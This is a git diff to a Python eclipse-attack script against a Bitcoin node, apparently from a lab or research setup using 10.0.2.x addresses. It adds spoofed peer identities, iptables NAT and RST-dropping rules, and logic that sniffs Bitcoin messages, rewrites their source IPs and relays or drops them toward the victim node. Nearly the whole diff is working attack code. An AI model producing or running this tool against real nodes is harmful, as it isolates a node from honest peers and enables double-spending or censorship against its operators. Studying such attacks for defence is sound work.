@@ -9,17 +9,34 @@ import socket, time, bitcoin
 from bitcoin.messages import msg_version, msg_verack, msg_addr
 from bitcoin.net import CAddress
 
-num_identities = 1
-network_interface = 'enp0s3'
+# Percentage (0 to 1) of packets to drop, else: relayed to victim
+eclipse_packet_drop_rate = 0.5
 
-victim_ip = '10.0.2.5'
+num_identities = 3
+network_interface = 'enp0s3'
+ip_alias_network_interface = 'wlan0'
+
+victim_ip = '10.0.2.7'
 victim_port = 8333
+
+attacker_ip = '10.0.2.6'
 attacker_port = random.randint(1024,65535)
 
-spoof_IPs = []
+spoof_IP_and_ports = []
 spoof_IP_sockets = []
 
 iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'
+
+def ip_alias(ip_address):
+	print(f'Setting up IP alias {ip_address}')
+	global alias_num
+	#terminal(f'sudo iptables -i {ip_alias_network_interface}:{alias_num} {ip_address} up')
+	
+	terminal(f'iptables -t nat -A PREROUTING -d {ip_address} -j DNAT --to-destination 0.0.0.0')
+
+	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
+	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
+	alias_num += 1
 
 def terminal(cmd):
 	# print('\n> '+cmd)
@@ -57,6 +74,9 @@ def addr_packet(str_addrs):
 	return msg
 
 def initialize_fake_connection(src_ip, dst_ip):
+	########## Temporary
+	src_ip = attacker_ip
+	##########
 	src_port = attacker_port
 	dst_port = victim_port
 
@@ -80,6 +100,8 @@ def initialize_fake_connection(src_ip, dst_ip):
 	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
 	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
 	"""
+
+	ip_alias(src_ip)
 
 	
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -105,7 +127,7 @@ def initialize_fake_connection(src_ip, dst_ip):
 	print(s.recv(1024)) # Next message received must be <= 1024 bytes
 	
 
-	spoof_IPs.append((src_ip, src_port))
+	spoof_IP_and_ports.append((src_ip, src_port))
 	spoof_IP_sockets.append(s)
 
 	print('\n\n*** ')
@@ -135,6 +157,23 @@ def packet_received(packet):
 	msgtype = packet.load[4:16].decode()
 	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')
 
+	# Relay Bitcoin packets that aren't from the victim
+	if packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
+		if len(spoof_IP_sockets) > 0:
+			if random.random() > eclipse_packet_drop_rate:
+				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
+				rand_ip = spoof_IP_and_ports[rand_i][0]
+				rand_port = spoof_IP_and_ports[rand_i][1]
+				rand_socket = spoof_IP_sockets[rand_i]
+
+				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
+				packet[IP].src = rand_ip
+				packet[IP].dst = victim_ip
+				try:
+					rand_socket.send(raw(packet))
+				except:
+					print('Relaying message FAILED')
+
 	if msgtype == 'verack':
 		# Successful connection! Move from pending to successful
 		pass
@@ -144,7 +183,9 @@ def packet_received(packet):
 
 
 def initialize_network_info():
-	global bitcoin_subversion, bitcoin_protocolversion
+	global bitcoin_subversion
+	global bitcoin_protocolversion
+
 	bitcoin_subversion = '/Satoshi:0.18.0/'
 	bitcoin_protocolversion = 70015
 	try:
@@ -174,7 +215,11 @@ def on_close():
 	print('Goodbye.')
 
 
+# MAIN
 if __name__ == '__main__':
+	global alias_num
+	alias_num = 0 # Increments each alias
+	
 	initialize_network_info()
 
 	atexit.register(on_close)
@@ -183,6 +228,10 @@ if __name__ == '__main__':
 
 	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
 	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
+	# Make the spoofing IP up
+	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
+	#terminal('sudo ifconfig wlan0 up')
+
 	#time.sleep(10)
 	try:
 		start_new_thread(sniff, (), {
@@ -199,7 +248,7 @@ if __name__ == '__main__':
 			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
 		except ConnectionRefusedError:
 			print('Connection was refused. The victim\'s node must not be running.')
-	print(f'Successful connections: {len(spoof_IPs)}\n')
+	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')
 
 
 	while 1:
